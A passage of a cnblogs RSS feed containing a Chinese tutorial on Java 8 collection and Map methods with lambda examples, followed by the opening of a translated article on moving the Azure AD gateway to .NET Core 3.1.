&lt;p&gt;该方法签名为&lt;code&gt;boolean removeIf(Predicate&amp;lt;? super E&amp;gt; filter)&lt;/code&gt;，作用是&lt;strong&gt;删除容器中所有满足&lt;code&gt;filter&lt;/code&gt;指定条件的元素&lt;/strong&gt;，其中&lt;code&gt;Predicate&lt;/code&gt;是一个函数接口，里面只有一个待实现方法&lt;code&gt;boolean test(T t)&lt;/code&gt;，同样的这个方法的名字根本不重要，因为用的时候不需要书写这个名字。&lt;/p&gt;
&lt;p&gt;需求：&lt;em&gt;假设有一个字符串列表，需要删除其中所有长度大于3的字符串。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;我们知道如果需要在迭代过程冲对容器进行删除操作必须使用迭代器，否则会抛出&lt;code&gt;ConcurrentModificationException&lt;/code&gt;，所以上述任务传统的写法是：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 使用迭代器删除列表元素
ArrayList&amp;lt;String&amp;gt; list = new ArrayList&amp;lt;&amp;gt;(Arrays.asList(&quot;I&quot;, &quot;love&quot;, &quot;you&quot;, &quot;too&quot;));
Iterator&amp;lt;String&amp;gt; it = list.iterator();
while(it.hasNext()){
    if(it.next().length()&amp;gt;3) // 删除长度大于3的元素
        it.remove();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;现在使用&lt;code&gt;removeIf()&lt;/code&gt;方法结合匿名内部类，我们可是这样实现：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 使用removeIf()结合匿名名内部类实现
ArrayList&amp;lt;String&amp;gt; list = new ArrayList&amp;lt;&amp;gt;(Arrays.asList(&quot;I&quot;, &quot;love&quot;, &quot;you&quot;, &quot;too&quot;));
list.removeIf(new Predicate&amp;lt;String&amp;gt;(){ // 删除长度大于3的元素
    @Override
    public boolean test(String str){
        return str.length()&amp;gt;3;
    }
});
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上述代码使用&lt;code&gt;removeIf()&lt;/code&gt;方法，并使用匿名内部类实现&lt;code&gt;Precicate&lt;/code&gt;接口。相信你已经想到用Lambda表达式该怎么写了：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 使用removeIf()结合Lambda表达式实现
ArrayList&amp;lt;String&amp;gt; list = new ArrayList&amp;lt;&amp;gt;(Arrays.asList(&quot;I&quot;, &quot;love&quot;, &quot;you&quot;, &quot;too&quot;));
list.removeIf(str -&amp;gt; str.length()&amp;gt;3); // 删除长度大于3的元素
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用Lambda表达式不需要记忆&lt;code&gt;Predicate&lt;/code&gt;接口名，也不需要记忆&lt;code&gt;test()&lt;/code&gt;方法名，只需要知道此处需要一个返回布尔类型的Lambda表达式就行了。&lt;/p&gt;
&lt;h4 id=&quot;replaceall&quot;&gt;replaceAll()&lt;/h4&gt;
&lt;p&gt;该方法签名为&lt;code&gt;void replaceAll(UnaryOperator&amp;lt;E&amp;gt; operator)&lt;/code&gt;，作用是&lt;strong&gt;对每个元素执行&lt;code&gt;operator&lt;/code&gt;指定的操作，并用操作结果来替换原来的元素&lt;/strong&gt;。其中&lt;code&gt;UnaryOperator&lt;/code&gt;是一个函数接口，里面只有一个待实现函数&lt;code&gt;T apply(T t)&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;需求：&lt;em&gt;假设有一个字符串列表，将其中所有长度大于3的元素转换成大写，其余元素不变。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Java7及之前似乎没有优雅的办法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 使用下标实现元素替换
ArrayList&amp;lt;String&amp;gt; list = new ArrayList&amp;lt;&amp;gt;(Arrays.asList(&quot;I&quot;, &quot;love&quot;, &quot;you&quot;, &quot;too&quot;));
for(int i=0; i&amp;lt;list.size(); i++){
    String str = list.get(i);
    if(str.length()&amp;gt;3)
        list.set(i, str.toUpperCase());
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;replaceAll()&lt;/code&gt;方法结合匿名内部类可以实现如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 使用匿名内部类实现
ArrayList&amp;lt;String&amp;gt; list = new ArrayList&amp;lt;&amp;gt;(Arrays.asList(&quot;I&quot;, &quot;love&quot;, &quot;you&quot;, &quot;too&quot;));
list.replaceAll(new UnaryOperator&amp;lt;String&amp;gt;(){
    @Override
    public String apply(String str){
        if(str.length()&amp;gt;3)
            return str.toUpperCase();
        return str;
    }
});
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上述代码调用&lt;code&gt;replaceAll()&lt;/code&gt;方法，并使用匿名内部类实现&lt;code&gt;UnaryOperator&lt;/code&gt;接口。我们知道可以用更为简洁的Lambda表达式实现：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 使用Lambda表达式实现
ArrayList&amp;lt;String&amp;gt; list = new ArrayList&amp;lt;&amp;gt;(Arrays.asList(&quot;I&quot;, &quot;love&quot;, &quot;you&quot;, &quot;too&quot;));
list.replaceAll(str -&amp;gt; {
    if(str.length()&amp;gt;3)
        return str.toUpperCase();
    return str;
});
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;sort&quot;&gt;sort()&lt;/h4&gt;
&lt;p&gt;该方法定义在&lt;code&gt;List&lt;/code&gt;接口中，方法签名为&lt;code&gt;void sort(Comparator&amp;lt;? super E&amp;gt; c)&lt;/code&gt;，该方法&lt;strong&gt;根据&lt;code&gt;c&lt;/code&gt;指定的比较规则对容器元素进行排序&lt;/strong&gt;。&lt;code&gt;Comparator&lt;/code&gt;接口我们并不陌生，其中有一个方法&lt;code&gt;int compare(T o1, T o2)&lt;/code&gt;需要实现，显然该接口是个函数接口。&lt;/p&gt;
&lt;p&gt;需求：&lt;em&gt;假设有一个字符串列表，按照字符串长度增序对元素排序。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;由于Java7以及之前&lt;code&gt;sort()&lt;/code&gt;方法在&lt;code&gt;Collections&lt;/code&gt;工具类中，所以代码要这样写：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// Collections.sort()方法
ArrayList&amp;lt;String&amp;gt; list = new ArrayList&amp;lt;&amp;gt;(Arrays.asList(&quot;I&quot;, &quot;love&quot;, &quot;you&quot;, &quot;too&quot;));
Collections.sort(list, new Comparator&amp;lt;String&amp;gt;(){
    @Override
    public int compare(String str1, String str2){
        return str1.length()-str2.length();
    }
});
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;现在可以直接使用&lt;code&gt;List.sort()方法&lt;/code&gt;，结合Lambda表达式，可以这样写：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// List.sort()方法结合Lambda表达式
ArrayList&amp;lt;String&amp;gt; list = new ArrayList&amp;lt;&amp;gt;(Arrays.asList(&quot;I&quot;, &quot;love&quot;, &quot;you&quot;, &quot;too&quot;));
list.sort((str1, str2) -&amp;gt; str1.length()-str2.length());
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;spliterator&quot;&gt;spliterator()&lt;/h4&gt;
&lt;p&gt;方法签名为&lt;code&gt;Spliterator&amp;lt;E&amp;gt; spliterator()&lt;/code&gt;，该方法返回容器的&lt;strong&gt;可拆分迭代器&lt;/strong&gt;。从名字来看该方法跟&lt;code&gt;iterator()&lt;/code&gt;方法有点像，我们知道&lt;code&gt;Iterator&lt;/code&gt;是用来迭代容器的，&lt;code&gt;Spliterator&lt;/code&gt;也有类似作用，但二者有如下不同：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;code&gt;Spliterator&lt;/code&gt;既可以像&lt;code&gt;Iterator&lt;/code&gt;那样逐个迭代，也可以批量迭代。批量迭代可以降低迭代的开销。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Spliterator&lt;/code&gt;是可拆分的，一个&lt;code&gt;Spliterator&lt;/code&gt;可以通过调用&lt;code&gt;Spliterator&amp;lt;T&amp;gt; trySplit()&lt;/code&gt;方法来尝试分成两个。一个是&lt;code&gt;this&lt;/code&gt;，另一个是新返回的那个，这两个迭代器代表的元素没有重叠。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;可通过（多次）调用&lt;code&gt;Spliterator.trySplit()&lt;/code&gt;方法来分解负载，以便多线程处理。&lt;/p&gt;
&lt;h4 id=&quot;stream和parallelstream&quot;&gt;stream()和parallelStream()&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;stream()&lt;/code&gt;和&lt;code&gt;parallelStream()&lt;/code&gt;分别&lt;strong&gt;返回该容器的&lt;code&gt;Stream&lt;/code&gt;视图表示&lt;/strong&gt;，不同之处在于&lt;code&gt;parallelStream()&lt;/code&gt;返回并行的&lt;code&gt;Stream&lt;/code&gt;。&lt;strong&gt;&lt;code&gt;Stream&lt;/code&gt;是Java函数式编程的核心类&lt;/strong&gt;，我们会在后面章节中学习。&lt;/p&gt;
&lt;h3 id=&quot;map中的新方法&quot;&gt;Map中的新方法&lt;/h3&gt;
&lt;p&gt;相比&lt;code&gt;Collection&lt;/code&gt;，&lt;code&gt;Map&lt;/code&gt;中加入了更多的方法，我们以&lt;code&gt;HashMap&lt;/code&gt;为例来逐一探秘。了解[Java7&lt;code&gt;HashMap&lt;/code&gt;实现原理](&lt;a href=&quot;https://github.com/CarpenterLee/JCFInternals/blob/master/markdown/6-HashSet&quot; target=&quot;_blank&quot;&gt;https://github.com/CarpenterLee/JCFInternals/blob/master/markdown/6-HashSet&lt;/a&gt; and HashMap.md)，将有助于理解下文。&lt;/p&gt;
&lt;h4 id=&quot;foreach-1&quot;&gt;forEach()&lt;/h4&gt;
&lt;p&gt;该方法签名为&lt;code&gt;void forEach(BiConsumer&amp;lt;? super K,? super V&amp;gt; action)&lt;/code&gt;，作用是&lt;strong&gt;对&lt;code&gt;Map&lt;/code&gt;中的每个映射执行&lt;code&gt;action&lt;/code&gt;指定的操作&lt;/strong&gt;，其中&lt;code&gt;BiConsumer&lt;/code&gt;是一个函数接口，里面有一个待实现方法&lt;code&gt;void accept(T t, U u)&lt;/code&gt;。&lt;code&gt;BinConsumer&lt;/code&gt;接口名字和&lt;code&gt;accept()&lt;/code&gt;方法名字都不重要，请不要记忆他们。&lt;/p&gt;
&lt;p&gt;需求：&lt;em&gt;假设有一个数字到对应英文单词的Map，请输出Map中的所有映射关系．&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Java7以及之前经典的代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// Java7以及之前迭代Map
HashMap&amp;lt;Integer, String&amp;gt; map = new HashMap&amp;lt;&amp;gt;();
map.put(1, &quot;one&quot;);
map.put(2, &quot;two&quot;);
map.put(3, &quot;three&quot;);
for(Map.Entry&amp;lt;Integer, String&amp;gt; entry : map.entrySet()){
    System.out.println(entry.getKey() + &quot;=&quot; + entry.getValue());
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;Map.forEach()&lt;/code&gt;方法，结合匿名内部类，代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 使用forEach()结合匿名内部类迭代Map
HashMap&amp;lt;Integer, String&amp;gt; map = new HashMap&amp;lt;&amp;gt;();
map.put(1, &quot;one&quot;);
map.put(2, &quot;two&quot;);
map.put(3, &quot;three&quot;);
map.forEach(new BiConsumer&amp;lt;Integer, String&amp;gt;(){
    @Override
    public void accept(Integer k, String v){
        System.out.println(k + &quot;=&quot; + v);
    }
});
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上述代码调用&lt;code&gt;forEach()&lt;/code&gt;方法，并使用匿名内部类实现&lt;code&gt;BiConsumer&lt;/code&gt;接口。当然，实际场景中没人使用匿名内部类写法，因为有Lambda表达式：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 使用forEach()结合Lambda表达式迭代Map
HashMap&amp;lt;Integer, String&amp;gt; map = new HashMap&amp;lt;&amp;gt;();
map.put(1, &quot;one&quot;);
map.put(2, &quot;two&quot;);
map.put(3, &quot;three&quot;);
map.forEach((k, v) -&amp;gt; System.out.println(k + &quot;=&quot; + v));
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;getordefault&quot;&gt;getOrDefault()&lt;/h4&gt;
&lt;p&gt;该方法跟Lambda表达式没关系，但是很有用。方法签名为&lt;code&gt;V getOrDefault(Object key, V defaultValue)&lt;/code&gt;，作用是&lt;strong&gt;按照给定的&lt;code&gt;key&lt;/code&gt;查询&lt;code&gt;Map&lt;/code&gt;中对应的&lt;code&gt;value&lt;/code&gt;，如果没有找到则返回&lt;code&gt;defaultValue&lt;/code&gt;&lt;/strong&gt;。使用该方法程序员可以省去查询指定键值是否存在的麻烦．&lt;/p&gt;
&lt;p&gt;需求；&lt;em&gt;假设有一个数字到对应英文单词的Map，输出4对应的英文单词，如果不存在则输出NoValue&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 查询Map中指定的值，不存在时使用默认值
HashMap&amp;lt;Integer, String&amp;gt; map = new HashMap&amp;lt;&amp;gt;();
map.put(1, &quot;one&quot;);
map.put(2, &quot;two&quot;);
map.put(3, &quot;three&quot;);
// Java7以及之前做法
if(map.containsKey(4)){ // 1
    System.out.println(map.get(4));
}else{
    System.out.println(&quot;NoValue&quot;);
}
// Java8使用Map.getOrDefault()
System.out.println(map.getOrDefault(4, &quot;NoValue&quot;)); // 2
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;putifabsent&quot;&gt;putIfAbsent()&lt;/h4&gt;
&lt;p&gt;该方法跟Lambda表达式没关系，但是很有用。方法签名为&lt;code&gt;V putIfAbsent(K key, V value)&lt;/code&gt;，作用是只有在&lt;strong&gt;不存在&lt;code&gt;key&lt;/code&gt;值的映射或映射值为&lt;code&gt;null&lt;/code&gt;时&lt;/strong&gt;，才将&lt;code&gt;value&lt;/code&gt;指定的值放入到&lt;code&gt;Map&lt;/code&gt;中，否则不对&lt;code&gt;Map&lt;/code&gt;做更改．该方法将条件判断和赋值合二为一，使用起来更加方便．&lt;/p&gt;
&lt;h4 id=&quot;remove&quot;&gt;remove()&lt;/h4&gt;
&lt;p&gt;我们都知道&lt;code&gt;Map&lt;/code&gt;中有一个&lt;code&gt;remove(Object key)&lt;/code&gt;方法，来根据指定&lt;code&gt;key&lt;/code&gt;值删除&lt;code&gt;Map&lt;/code&gt;中的映射关系；Java8新增了&lt;code&gt;remove(Object key, Object value)&lt;/code&gt;方法，只有在当前&lt;code&gt;Map&lt;/code&gt;中&lt;strong&gt;&lt;code&gt;key&lt;/code&gt;正好映射到&lt;code&gt;value&lt;/code&gt;时&lt;/strong&gt;才删除该映射，否则什么也不做．&lt;/p&gt;
&lt;h4 id=&quot;replace&quot;&gt;replace()&lt;/h4&gt;
&lt;p&gt;在Java7及以前，要想替换&lt;code&gt;Map&lt;/code&gt;中的映射关系可通过&lt;code&gt;put(K key, V value)&lt;/code&gt;方法实现，该方法总是会用新值替换原来的值．为了更精确的控制替换行为，Java8在&lt;code&gt;Map&lt;/code&gt;中加入了两个&lt;code&gt;replace()&lt;/code&gt;方法，分别如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;replace(K key, V value)&lt;/code&gt;，只有在当前&lt;code&gt;Map&lt;/code&gt;中&lt;strong&gt;&lt;code&gt;key&lt;/code&gt;的映射存在时&lt;/strong&gt;才用&lt;code&gt;value&lt;/code&gt;去替换原来的值，否则什么也不做．&lt;/li&gt;
&lt;li&gt;&lt;code&gt;replace(K key, V oldValue, V newValue)&lt;/code&gt;，只有在当前&lt;code&gt;Map&lt;/code&gt;中&lt;strong&gt;&lt;code&gt;key&lt;/code&gt;的映射存在且等于&lt;code&gt;oldValue&lt;/code&gt;时&lt;/strong&gt;才用&lt;code&gt;newValue&lt;/code&gt;去替换原来的值，否则什么也不做．&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;replaceall-1&quot;&gt;replaceAll()&lt;/h4&gt;
&lt;p&gt;该方法签名为&lt;code&gt;replaceAll(BiFunction&amp;lt;? super K,? super V,? extends V&amp;gt; function)&lt;/code&gt;，作用是对&lt;code&gt;Map&lt;/code&gt;中的每个映射执行&lt;code&gt;function&lt;/code&gt;指定的操作，并用&lt;code&gt;function&lt;/code&gt;的执行结果替换原来的&lt;code&gt;value&lt;/code&gt;，其中&lt;code&gt;BiFunction&lt;/code&gt;是一个函数接口，里面有一个待实现方法&lt;code&gt;R apply(T t, U u)&lt;/code&gt;．不要被如此多的函数接口吓到，因为使用的时候根本不需要知道他们的名字．&lt;/p&gt;
&lt;p&gt;需求：&lt;em&gt;假设有一个数字到对应英文单词的Map，请将原来映射关系中的单词都转换成大写．&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Java7以及之前经典的代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// Java7以及之前替换所有Map中所有映射关系
HashMap&amp;lt;Integer, String&amp;gt; map = new HashMap&amp;lt;&amp;gt;();
map.put(1, &quot;one&quot;);
map.put(2, &quot;two&quot;);
map.put(3, &quot;three&quot;);
for(Map.Entry&amp;lt;Integer, String&amp;gt; entry : map.entrySet()){
    entry.setValue(entry.getValue().toUpperCase());
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;replaceAll()&lt;/code&gt;方法结合匿名内部类，实现如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 使用replaceAll()结合匿名内部类实现
HashMap&amp;lt;Integer, String&amp;gt; map = new HashMap&amp;lt;&amp;gt;();
map.put(1, &quot;one&quot;);
map.put(2, &quot;two&quot;);
map.put(3, &quot;three&quot;);
map.replaceAll(new BiFunction&amp;lt;Integer, String, String&amp;gt;(){
    @Override
    public String apply(Integer k, String v){
        return v.toUpperCase();
    }
});
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上述代码调用&lt;code&gt;replaceAll()&lt;/code&gt;方法，并使用匿名内部类实现&lt;code&gt;BiFunction&lt;/code&gt;接口。更进一步的，使用Lambda表达式实现如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 使用replaceAll()结合Lambda表达式实现
HashMap&amp;lt;Integer, String&amp;gt; map = new HashMap&amp;lt;&amp;gt;();
map.put(1, &quot;one&quot;);
map.put(2, &quot;two&quot;);
map.put(3, &quot;three&quot;);
map.replaceAll((k, v) -&amp;gt; v.toUpperCase());
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;简洁到让人难以置信．&lt;/p&gt;
&lt;h4 id=&quot;merge&quot;&gt;merge()&lt;/h4&gt;
&lt;p&gt;该方法签名为&lt;code&gt;merge(K key, V value, BiFunction&amp;lt;? super V,? super V,? extends V&amp;gt; remappingFunction)&lt;/code&gt;，作用是：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;如果&lt;code&gt;Map&lt;/code&gt;中&lt;code&gt;key&lt;/code&gt;对应的映射不存在或者为&lt;code&gt;null&lt;/code&gt;，则将&lt;code&gt;value&lt;/code&gt;（不能是&lt;code&gt;null&lt;/code&gt;）关联到&lt;code&gt;key&lt;/code&gt;上；&lt;/li&gt;
&lt;li&gt;否则执行&lt;code&gt;remappingFunction&lt;/code&gt;，如果执行结果非&lt;code&gt;null&lt;/code&gt;则用该结果跟&lt;code&gt;key&lt;/code&gt;关联，否则在&lt;code&gt;Map&lt;/code&gt;中删除&lt;code&gt;key&lt;/code&gt;的映射．&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;参数中&lt;code&gt;BiFunction&lt;/code&gt;函数接口前面已经介绍过，里面有一个待实现方法&lt;code&gt;R apply(T t, U u)&lt;/code&gt;．&lt;/p&gt;
&lt;p&gt;&lt;code&gt;merge()&lt;/code&gt;方法虽然语义有些复杂，但该方法的用方式很明确，一个比较常见的场景是将新的错误信息拼接到原来的信息上，比如：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;map.merge(key, newMsg, (v1, v2) -&amp;gt; v1+v2);
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;compute&quot;&gt;compute()&lt;/h4&gt;
&lt;p&gt;该方法签名为&lt;code&gt;compute(K key, BiFunction&amp;lt;? super K,? super V,? extends V&amp;gt; remappingFunction)&lt;/code&gt;，作用是把&lt;code&gt;remappingFunction&lt;/code&gt;的计算结果关联到&lt;code&gt;key&lt;/code&gt;上，如果计算结果为&lt;code&gt;null&lt;/code&gt;，则在&lt;code&gt;Map&lt;/code&gt;中删除&lt;code&gt;key&lt;/code&gt;的映射．&lt;/p&gt;
&lt;p&gt;要实现上述&lt;code&gt;merge()&lt;/code&gt;方法中错误信息拼接的例子，使用&lt;code&gt;compute()&lt;/code&gt;代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;map.compute(key, (k,v) -&amp;gt; v==null ? newMsg : v.concat(newMsg));
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;computeifabsent&quot;&gt;computeIfAbsent()&lt;/h4&gt;
&lt;p&gt;该方法签名为&lt;code&gt;V computeIfAbsent(K key, Function&amp;lt;? super K,? extends V&amp;gt; mappingFunction)&lt;/code&gt;，作用是：只有在当前&lt;code&gt;Map&lt;/code&gt;中&lt;strong&gt;不存在&lt;code&gt;key&lt;/code&gt;值的映射或映射值为&lt;code&gt;null&lt;/code&gt;时&lt;/strong&gt;，才调用&lt;code&gt;mappingFunction&lt;/code&gt;，并在&lt;code&gt;mappingFunction&lt;/code&gt;执行结果非&lt;code&gt;null&lt;/code&gt;时，将结果跟&lt;code&gt;key&lt;/code&gt;关联．&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Function&lt;/code&gt;是一个函数接口，里面有一个待实现方法&lt;code&gt;R apply(T t)&lt;/code&gt;．&lt;/p&gt;
&lt;p&gt;&lt;code&gt;computeIfAbsent()&lt;/code&gt;常用来对&lt;code&gt;Map&lt;/code&gt;的某个&lt;code&gt;key&lt;/code&gt;值建立初始化映射．比如我们要实现一个多值映射，&lt;code&gt;Map&lt;/code&gt;的定义可能是&lt;code&gt;Map&amp;lt;K,Set&amp;lt;V&amp;gt;&amp;gt;&lt;/code&gt;，要向&lt;code&gt;Map&lt;/code&gt;中放入新值，可通过如下代码实现：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Map&amp;lt;Integer, Set&amp;lt;String&amp;gt;&amp;gt; map = new HashMap&amp;lt;&amp;gt;();
// Java7及以前的实现方式
if(map.containsKey(1)){
    map.get(1).add(&quot;one&quot;);
}else{
    Set&amp;lt;String&amp;gt; valueSet = new HashSet&amp;lt;String&amp;gt;();
    valueSet.add(&quot;one&quot;);
    map.put(1, valueSet);
}
// Java8的实现方式
map.computeIfAbsent(1, v -&amp;gt; new HashSet&amp;lt;String&amp;gt;()).add(&quot;yi&quot;);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;computeIfAbsent()&lt;/code&gt;将条件判断和添加操作合二为一，使代码更加简洁．&lt;/p&gt;
&lt;h4 id=&quot;computeifpresent&quot;&gt;computeIfPresent()&lt;/h4&gt;
&lt;p&gt;该方法签名为&lt;code&gt;V computeIfPresent(K key, BiFunction&amp;lt;? super K,? super V,? extends V&amp;gt; remappingFunction)&lt;/code&gt;，作用跟&lt;code&gt;computeIfAbsent()&lt;/code&gt;相反，即，只有在当前&lt;code&gt;Map&lt;/code&gt;中&lt;strong&gt;存在&lt;code&gt;key&lt;/code&gt;值的映射且非&lt;code&gt;null&lt;/code&gt;时&lt;/strong&gt;，才调用&lt;code&gt;remappingFunction&lt;/code&gt;，如果&lt;code&gt;remappingFunction&lt;/code&gt;执行结果为&lt;code&gt;null&lt;/code&gt;，则删除&lt;code&gt;key&lt;/code&gt;的映射，否则使用该结果替换&lt;code&gt;key&lt;/code&gt;原来的映射．&lt;/p&gt;
&lt;p&gt;这个函数的功能跟如下代码是等效的：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// Java7及以前跟computeIfPresent()等效的代码
if (map.get(key) != null) {
    V oldValue = map.get(key);
    V newValue = remappingFunction.apply(key, oldValue);
    if (newValue != null)
        map.put(key, newValue);
    else
        map.remove(key);
    return newValue;
}
return null;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol&gt;&lt;li&gt;Java8为容器新增一些有用的方法，这些方法有些是为&lt;strong&gt;完善原有功能&lt;/strong&gt;，有些是为&lt;strong&gt;引入函数式编程&lt;/strong&gt;，学习和使用这些方法有助于我们写出更加简洁有效的代码．&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;函数接口&lt;/strong&gt;虽然很多，但绝大多数时候我们根本不需要知道它们的名字，书写Lambda表达式时类型推断帮我们做了一切．&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;参考：&lt;a href=&quot;https://github.com/CarpenterLee/JavaLambdaInternals&quot; target=&quot;_blank&quot;&gt;https://github.com/CarpenterLee/JavaLambdaInternals&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 19 Jan 2021 00:29:00 +0000</pubDate>
<dc:creator>说故事的五公子</dc:creator>
<og:description>函数式编程 在正式学习Lambda之前，我们先来了解一下什么是函数式编程 我们先看看什么是函数。函数是一种最基本的任务，一个大型程序就是一个顶层函数调用若干底层函数，这些被调用的函数又可以调用其他函数</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/wugongzi/p/14296157.html</dc:identifier>
</item>
<item>
<title>[翻译]Azure 网关迁移至 .NET Core 3.1 性能提升一倍 - Rwing</title>
<link>http://www.cnblogs.com/Rwing/p/azure-active-directorys-gateway-service-is-on-net-core-3-1.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Rwing/p/azure-active-directorys-gateway-service-is-on-net-core-3-1.html</guid>
<description>&lt;p&gt;Azure Active Directory 的网关服务是一个反向代理，它为构成 Azure AD 的数百个服务提供前置服务。如果你使用过 office.com、outlook.com、azure.com 或 xbox.live.com 等服务，那么你已经使用了 Azure AD 的网关。网关为 Azure AD 中的服务提供了 TLS 终止、自动故障切换/重试、地理位置临近度路由、节流和 tarpitting 等功能。该网关存在于全球超过 53 个 Azure 数据中心中，每天服务于约 115 亿次请求。一直以来，Azure AD 的网关都运行在 .NET Framework 4.6.2 上，直到2020年9月，我们把它迁移到了.NET Core 3.1上。&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;73.029830810329&quot;&gt;
&lt;p&gt;原文:[&lt;a href=&quot;https://devblogs.microsoft.com/dotnet/azure-active-directorys-gateway-service-is-on-net-core-3-1/&quot; target=&quot;_blank&quot;&gt;Azure Active Directory’s gateway is on .NET Core 3.1!&lt;/a&gt;]&lt;/p&gt;
&lt;p&gt;Azure Active Directory 的网关服务是一个反向代理，它为构成 Azure AD 的数百个服务提供前置服务。如果你使用过 office.com、outlook.com、azure.com 或 xbox.live.com 等服务，那么你已经使用了 Azure AD 的网关。网关为 Azure AD 中的服务提供了 TLS 终止、自动故障切换/重试、地理位置临近度路由、节流和 tarpitting 等功能。该网关存在于全球超过 53 个 Azure 数据中心中，每天服务于约 115 亿次请求。一直以来，Azure AD 的网关都运行在 .NET Framework 4.6.2 上，直到2020年9月，我们把它迁移到了.NET Core 3.1上。&lt;/p&gt;
&lt;h3 id=&quot;移植到-net-core-的动机&quot;&gt;移植到 .NET Core 的动机&lt;/h3&gt;
&lt;p&gt;网关的执行规模导致计算资源的大量消耗，而计算资源的消耗又要花费大量的金钱。寻找降低服务执行成本的方法一直是我们团队的一个关键目标。而 .NET Core 对性能的大量改进引起了我们的注意，尤其是 TechEmpower 将ASP.NET Core 列为全球最快的 Web 框架之一。我们在 .NET Core 上的对网关原型运行了基准测试，测试结果让人很容易做出决定：我们&lt;strong&gt;必须&lt;/strong&gt;移植到 .NET Core 上。&lt;/p&gt;
&lt;h3 id=&quot;net-core-的性能改进能否转化为现实中的成本节约？&quot;&gt;.NET Core 的性能改进能否转化为现实中的成本节约？&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;绝对是的&lt;/strong&gt;。在 Azure AD 网关这个案例中，我们能够削减 50% 的 CPU 成本。&lt;br/&gt;这个网关曾经在 IIS 上运行并采用 .NET Framework 4.6.2。如今，它运行在 .NET Core 3.1 的 IIS 上。&lt;br/&gt;下图显示，与 .NET Framework 4.6.2 相比，我们在 .NET Core 3.1 上的 CPU 使用量减少了一半（有效地将我们的吞吐量提高了一倍）。&lt;br/&gt;由于吞吐量的提升，使得我们能够将集群规模从 4 万个核心减少到约 2 万个核心（减少50%），如图二。&lt;/p&gt;
&lt;p&gt;（图一）&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/23440/202101/23440-20210119083535462-719604208.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（图二）&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/23440/202101/23440-20210119083636343-333875553.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;未来&quot;&gt;未来&lt;/h3&gt;
